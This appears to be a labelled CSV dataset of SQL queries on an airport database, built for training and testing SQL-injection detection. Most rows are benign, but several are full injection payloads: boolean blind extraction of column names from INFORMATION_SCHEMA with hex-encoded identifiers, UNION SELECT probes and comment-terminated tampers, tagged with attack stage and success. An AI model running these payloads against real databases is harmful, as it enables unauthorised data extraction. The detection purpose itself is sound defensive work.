full_query,label,user_inputs,attack_stage,tamper_method,attack_status,statement_type,query_template_id,attack_id,attack_technique,split
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""US-0224"";",0,US-0224,,,,select,airport-S7,,,test
"UPDATE airport_frequencies SET type = 'TWR' WHERE airport_ident IN ('FXSH','TA67','FZQN','19GA');",0,FXSH TA67 FZQN 19GA,,,,update,airport-U10,,,train
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""MX"") OR a.elevation_ft > 1020.0",0,MX 1020.0,,,,select,airport-S11,,,test
"DELETE FROM regions WHERE name = ""Trnava Region"";",0,Trnava Region,,,,delete,airport-D8,,,test
"DELETE FROM regions WHERE name = ""Haute-Kotto"";",0,Haute-Kotto,,,,delete,airport-D8,,,test
"DELETE FROM airport_frequencies WHERE type = ""DEP"";",0,DEP,,,,delete,airport-D4,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Chu Lai Stagefield Army Heliport"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Chu Lai Stagefield Army Heliport,,,,select,airport-S14,,,test
"SELECT * FROM airport WHERE gps_code = ""SC65"" OR local_code = ""1M4""",0,SC65 1M4,,,,select,airport-S4,,,train
SELECT * FROM airport WHERE icao_code = 'SVCU';,0,SVCU,,,,select,airport-S1,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 122.8 AND  124.3  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  128.65  AND  119.475  ORDER BY frequency;",0,122.8 124.3 128.65 119.475,,,,select,airport-S13,,,test
"SELECT * FROM airport WHERE gps_code = ""SLPA"" OR local_code = ""42OI""",0,SLPA 42OI,,,,select,airport-S4,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""TE95"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in (unassigned)"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Cambodian airports"", ""%"");",0,TE95 Airports in (unassigned) Cambodian airports,,,,select,airport-S18,,,test
"UPDATE airport SET name = ""Zilfi Airport"" WHERE ident = ""US-1415""",0,Zilfi Airport US-1415,,,,update,airport-U1,,,test
"SELECT * FROM airport WHERE continent = ""SA"" AND iso_region LIKE ""US-NE""",0,SA US-NE,,,,select,airport-S8,,,test
"DELETE FROM navaids WHERE ident = ""BC"";",0,BC,,,,delete,airport-D6,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""PF"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 4 ORDER BY runway_count DESC, a.name ASC;",0,PF 4,,,,select,airport-S19,,,test
"INSERT INTO regions (code, local_code, name, continent, iso_country) VALUES (""VU-TAE"", ""B"", ""Beltinci Municipality"", ""AS"", ""AR"")",0,VU-TAE B Beltinci Municipality AS AR,,,,insert,airport-I5,,,train
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""MV-07"", ""Jambyl Region"", ""EU"", ""LV"", ""https://en.wikipedia.org/wiki/Mary_Region"", ""Airports in (unassigned)"")",0,MV-07 Jambyl Region EU LV https://en.wikipedia.org/wiki/Mary_Region Airports in (unassigned),,,,insert,airport-I4,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg) VALUES (""KFXY"", ""closed"", ""Cataract Scout Park Heliport"", 35.10868, -104.78900146484376)",0,KFXY closed Cataract Scout Park Heliport 35.10868 -104.78900146484376,,,,insert,airport-I1,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""GT"" GROUP BY r.name ORDER BY r.name ASC;",0,GT,,,,select,airport-S16,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""PR"" OR c.name LIKE CONCAT(""%"", ""Mongolia"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 5 ORDER BY navaid_count DESC;",0,PR Mongolia 5,,,,select,airport-S20,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""国立病院機構東広島医療センターヘリポート, National Health Organization Higashihiroshima Medical Center Heliport"") OR name LIKE ""Lenwood""",0,"国立病院機構東広島医療センターヘリポート, National Health Organization Higashihiroshima Medical Center Heliport Lenwood",,,,select,airport-S10,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""K-Fly Flying Field""",0,K-Fly Flying Field,,,,select,airport-S3,,,test
"DELETE FROM regions WHERE name = ""South Region"" AND 5742 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x72756e77617973 AND table_schema LIKE 0x64617461736574 LIMIT 9,1),2,1))>104) THEN 5742 ELSE (SELECT 6739 UNION SELECT 2471) END))-- -"";",1," South Region"" AND 5742 LIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name LIKE 0x72756e77617973 AND table_schema LIKE 0x64617461736574 LIMIT 9,1),2,1))>104) THEN 5742 ELSE (SELECT 6739 UNION SELECT 2471) END))-- - ",exploit,equaltolike,success,delete,airport-D8,boolean-150,boolean,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Escalante Municipal Airport""",0,Escalante Municipal Airport,,,,select,airport-S3,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""(FPSOs)"";",0,(FPSOs),,,,select,airport-S15,,,test
"SELECT a.id, a.name, a.municipality, a.iso_country FROM airport a WHERE a.id IN (SELECT id FROM airport WHERE keywords LIKE ""De Soto Parish Airport"") AND 3885=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x616972706f7274 AND table_schema=0x64617461736574 LIMIT 10,1),9,1))>106) THEN 3885 ELSE (SELECT 6695 UNION SELECT 9433) END))-- -"") OR name LIKE ""De Soto Parish Airport"") AND 3885=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x616972706f7274 AND table_schema=0x64617461736574 LIMIT 10,1),9,1))>106) THEN 3885 ELSE (SELECT 6695 UNION SELECT 9433) END))-- -""",1," De Soto Parish Airport ) AND 3885=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x616972706f7274 AND table_schema=0x64617461736574 LIMIT 10,1),9,1))>106) THEN 3885 ELSE (SELECT 6695 UNION SELECT 9433) END))-- - De Soto Parish Airport ) AND 3885=(SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(column_name AS NCHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name=0x616972706f7274 AND table_schema=0x64617461736574 LIMIT 10,1),9,1))>106) THEN 3885 ELSE (SELECT 6695 UNION SELECT 9433) END))-- - ",exploit,sleep2getlock,success,select,airport-S10,boolean-210,boolean,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Helicentro Ribeirão Preto Heliport""",0,Helicentro Ribeirão Preto Heliport,,,,select,airport-S3,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""North-Eastern Province"";",0,North-Eastern Province,,,,select,airport-S15,,,test
"UPDATE airport SET municipality = ""Eordaia"" WHERE iso_country = ""US""",0,Eordaia US,,,,update,airport-U2,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""5399"" AS SIGNED) AND a.iso_country = ""KZ"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,5399 KZ,,,,select,airport-S22,,,test
"SELECT af.type, af.description, af.frequency_mhz FROM airport_frequencies af WHERE af.airport_ident = ""24CD"";",0,24CD,,,,select,airport-S7,,,train
"SELECT id FROM airports WHERE elevation_feet BETWEEN 1580.0 AND 4849.0 AND longitude BETWEEN 86.06 AND -75.997803 AND name LIKE ""%OCoH3AnbqkXTbEvmu2Ib%"" OR name LIKE ""%zlS23RXsIYOGYGgaWo4F%"" AND iso_country LIKE ""FR""",0,1580.0 4849.0 86.06 -75.997803 OCoH3AnbqkXTbEvmu2Ib zlS23RXsIYOGYGgaWo4F FR,,,,select,airport-S23,,,train
"UPDATE airport_frequencies SET description = ""MISC"" WHERE airport_ident = ""NSFA"";",0,MISC NSFA,,,,update,airport-U5,,,test
"INSERT INTO countries (code, name, continent, keywords) VALUES (""BT"", ""Kiribati"", ""AF"", ""Airports in New Zealand"")",0,BT Kiribati AF Airports in New Zealand,,,,insert,airport-I6,,,test
"INSERT INTO airport (ident, type, name, latitude_deg, longitude_deg, elevation_ft) VALUES (""GB-0202"", ""closed"", ""Lalitpur Airport"", 44.107778, -70.728798, 4620.0)",0,GB-0202 closed Lalitpur Airport 44.107778 -70.728798 4620.0,,,,insert,airport-I2,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""US"") OR a.elevation_ft > 30.0",0,US 30.0,,,,select,airport-S11,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""VE"") OR a.elevation_ft > 2895.0",0,VE 2895.0,,,,select,airport-S11,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""Imam Khomeini Hospital Heliport"");",0,Imam Khomeini Hospital Heliport,,,,select,airport-S12,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""Pasanggerahan, Kampungbenteng"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Santa Rosa Department"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""Georgian airports"", ""%"");",0,"Pasanggerahan, Kampungbenteng Airports in Santa Rosa Department Georgian airports",,,,select,airport-S18,,,test
"INSERT INTO regions (code, name, continent, iso_country, wikipedia_link, keywords) VALUES (""KZ-ABA%' AND 6565 LIKE (SELECT (CASE WHEN (6565 LIKE 1603) THEN 6565 ELSE (SELECT 1603 UNION SELECT 2675) END))-- -"", ""Trujillo State"", ""EU"", ""AR"", ""https://en.wikipedia.org/wiki/Western_Cape"", ""Airports in Sumy Oblast"")",1, KZ-ABA%' AND 6565 LIKE (SELECT (CASE WHEN (6565 LIKE 1603) THEN 6565 ELSE (SELECT 1603 UNION SELECT 2675) END))-- - Trujillo State EU AR https://en.wikipedia.org/wiki/Western_Cape Airports in Sumy Oblast ,recon,equaltolike,success,insert,airport-I4,boolean-18,boolean,test
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""US-1560"",""small_airport')) AS lTiH WHERE 5634=5634 HAVING 6228=6206-- UIZn"", ""Old Santa Rosa Airport"",""https://en.wikipedia.org/wiki/Chokurdakh_Airport"",""EU"")",1, US-1560 small_airport')) AS lTiH WHERE 5634=5634 HAVING 6228=6206-- UIZn Old Santa Rosa Airport https://en.wikipedia.org/wiki/Chokurdakh_Airport EU ,recon,commentbeforeparentheses,failure,insert,airport-I3,boolean-12,boolean,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Plateau Department"";",0,Plateau Department,,,,select,airport-S15,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Trat Province"";",0,Trat Province,,,,select,airport-S15,,,test
"INSERT INTO runways (airport_ref, airport_ident, length_ft, surface, lighted, closed) VALUES (20264, ""SEBL"", 2625.0, ""-7434""))) UnIoN aLL sEleCt 5700,5700,5700,5700,5700,5700,5700,5700,5700#"", 0, 0)",1," 20264 SEBL 2625.0 -7434""    UnIoN aLL sEleCt 5700,5700,5700,5700,5700,5700,5700,5700,5700# 0 0 ",recon,randomcase,failure,insert,airport-I9,union-50,union,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""2329"" AS SIGNED) AND a.iso_country = ""MO"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,2329 MO,,,,select,airport-S22,,,test
"SELECT a.id, a.ident, a.name, a.latitude_deg, a.longitude_deg,(6371 * ACOS(COS(RADIANS(a.latitude_deg)) * COS(RADIANS(b.latitude_deg)) * COS(RADIANS(b.longitude_deg) - RADIANS(a.longitude_deg)) + SIN(RADIANS(a.latitude_deg)) * SIN(RADIANS(b.latitude_deg)))) AS distance FROM airport a JOIN airport b ON b.name = ""Juan-les-Pins Ultralight Seaplane Base"" WHERE a.id != b.id  ORDER BY distance LIMIT 50;",0,Juan-les-Pins Ultralight Seaplane Base,,,,select,airport-S14,,,test
"SELECT name, 'airport' AS entity_type FROM airport WHERE keywords LIKE CONCAT(""%"", ""Нацыянальны аэрапорт, Minsk 2 Airport"", ""%"") UNION SELECT name, 'region' AS entity_type FROM regions WHERE keywords LIKE CONCAT(""%"", ""Airports in Qacha's Nek District"", ""%"")  UNION SELECT name, 'country' AS entity_type FROM countries WHERE keywords LIKE CONCAT(""%"", ""American airports"", ""%"");",0,"Нацыянальны аэрапорт, Minsk 2 Airport Airports in Qacha's Nek District American airports",,,,select,airport-S18,,,test
"INSERT INTO airport (ident, type, name, wikipedia_link, continent) VALUES (""3NK7"",""heliport"", ""Susaki Airstrip"",""https://en.wikipedia.org/wiki/Pozna%C5%84-%C5%81awica_Airport"",""AS"")",0,3NK7 heliport Susaki Airstrip https://en.wikipedia.org/wiki/Pozna%C5%84-%C5%81awica_Airport AS,,,,insert,airport-I3,,,test
"SELECT a.ident, a.name, r.name AS region_name FROM airport a JOIN regions r ON a.iso_region = r.code WHERE r.name = ""Sermersooq Municipality"";",0,Sermersooq Municipality,,,,select,airport-S15,,,test
"SELECT name, IFNULL(iata_code, 'NO_IATA') AS iata_display, IFNULL(icao_code, 'NO_ICAO') AS icao_display,  MID(name, 1, 5) AS short_name, municipality FROM airport WHERE municipality LIKE ""Uruçuí;""",0,Uruçuí,,,,select,airport-S21,,,test
"SELECT n.type, c.name as country_name, COUNT(n.id) as navaid_count  FROM navaids n JOIN countries c ON n.iso_country = c.code WHERE c.code = ""VI"" OR c.name LIKE CONCAT(""%"", ""Serbia"") AS kBJQ WHERE 3013=3013 AND 7865=7865-- gPKk"", ""%"") GROUP BY n.type, c.name HAVING COUNT(n.id) > 4 ORDER BY navaid_count DESC;",1," VI Serbia"") AS kBJQ WHERE 3013=3013 AND 7865=7865-- gPKk 4 ",recon,commentbeforeparentheses,success,select,airport-S20,boolean-252,boolean,test
"DELETE FROM airport WHERE name LIKE ""Santa Maria Agricola Airport"" OR keywords LIKE ""WMAA, WMAA"";  ",0,"Santa Maria Agricola Airport WMAA, WMAA",,,,delete,airport-D3,,,test
"SELECT 'Airport Frequency' as source_type, af.airport_ident as code, a.name as location_name, af.type as frequency_type, af.frequency_mhz as frequency, af.description, a.municipality, a.iso_country FROM airport_frequencies af JOIN airport a ON af.airport_ident = a.ident WHERE af.frequency_mhz BETWEEN 131.01 AND  134.1  UNION ALL SELECT 'Navaid Frequency' as source_type,    n.ident as code, n.name as location_name, n.type as frequency_type,n.frequency_khz / 1000.0 as frequency,  n.usageType as description, 'N/A' as municipality, n.iso_country FROM navaids n WHERE n.frequency_khz IS NOT NULL AND (n.frequency_khz / 1000.0) BETWEEN  122.725  AND  121.9  ORDER BY frequency;",0,131.01 134.1 122.725 121.9,,,,select,airport-S13,,,test
"SELECT * FROM airport WHERE continent = ""SA"" AND iso_region LIKE ""AU-WA""",0,SA AU-WA,,,,select,airport-S8,,,test
"SELECT r.name AS region_name, COUNT(a.id) AS airport_count FROM airport a JOIN regions r ON a.iso_region = r.code WHERE a.iso_country = ""AT"" GROUP BY r.name ORDER BY r.name ASC;",0,AT,,,,select,airport-S16,,,train
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""BR"") OR a.elevation_ft > 490.0",0,BR 490.0,,,,select,airport-S11,,,test
"UPDATE navaids SET name = ""Makokou"" WHERE ident = ""7B"";",0,Makokou 7B,,,,update,airport-U7,,,test
"INSERT INTO regions (code, local_code, name, continent, iso_country) VALUES (""EC-U-A"", ""GB"", ""North Kazakhstan Region"", ""AF"", ""CL"")",0,EC-U-A GB North Kazakhstan Region AF CL,,,,insert,airport-I5,,,test
"SELECT * FROM airport WHERE gps_code = ""CLD2"" OR local_code = ""2TA9""",0,CLD2 2TA9,,,,select,airport-S4,,,test
"DELETE FROM airport WHERE ident=""GCLG"";",0,GCLG,,,,delete,airport-D1,,,test
"SELECT a.id, a.name, a.type, a.iso_country, a.municipality FROM airport a WHERE a.elevation_ft > (SELECT AVG(elevation_ft) FROM airport WHERE iso_country = ""BR"") OR a.elevation_ft > 5200.0",0,BR 5200.0,,,,select,airport-S11,,,test
"SELECT a.name AS airport_name, a.ident AS airport_code, a.municipality, COUNT(r.id) AS runway_count FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE a.iso_country = ""PY"" GROUP BY a.id, a.name, a.ident, a.municipality HAVING COUNT(r.id) > 3 ORDER BY runway_count DESC, a.name ASC;",0,PY 3,,,,select,airport-S19,,,train
SELECT * FROM airport WHERE icao_code = 'SDOU';,0,SDOU,,,,select,airport-S1,,,test
"SELECT a.name AS airport_name,a.municipality,COUNT(r.id) AS runway_count, CAST(AVG(r.length_ft) AS SIGNED) AS avg_runway_length FROM airport a JOIN runways r ON a.id = r.airport_ref WHERE r.length_ft >=  CAST(""4304"" AS SIGNED) AND a.iso_country = ""ZA"" GROUP BY a.id, a.name, a.municipality ORDER BY avg_runway_length DESC;",0,4304 ZA,,,,select,airport-S22,,,test
"UPDATE airport_frequencies SET description = ""BLAGNAC APP"" WHERE airport_ident = ""CA-0159"";",0,BLAGNAC APP CA-0159,,,,update,airport-U5,,,test
"SELECT id, length_ft, width_ft,surface, lighted, le_ident, he_ident FROM runways where airport_ref = (SELECT id FROM airport WHERE name = ""MKAD 35 Kilometr Helipad"");",0,MKAD 35 Kilometr Helipad,,,,select,airport-S12,,,test
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""Kizuna Heliport""",0,Kizuna Heliport,,,,select,airport-S3,,,test
